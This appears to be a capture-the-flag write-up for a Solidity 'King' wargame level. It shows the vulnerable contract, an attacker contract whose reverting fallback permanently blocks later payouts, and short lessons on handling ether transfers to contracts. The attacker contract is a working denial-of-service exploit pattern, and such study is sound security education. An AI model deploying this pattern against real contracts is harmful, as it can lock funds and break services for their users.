# King Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```
# Solution
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract HackKing {
    constructor(address payable _king) payable {
        (bool result, ) = _king.call{value: msg.value}("");
        require(result, "Failed to send value.");
    }

    fallback() external payable {
        revert();
    }
}
```

# What I learned
1. Some type of fallback should be used if contract uses a function to send money to an address in case that address is a contract instead of a wallet.
2. Setting fallback() from attacking contract is smart so eth can't be sent back.
3. You can use a fallback with simply 'revert()' and solidity is okay with that.
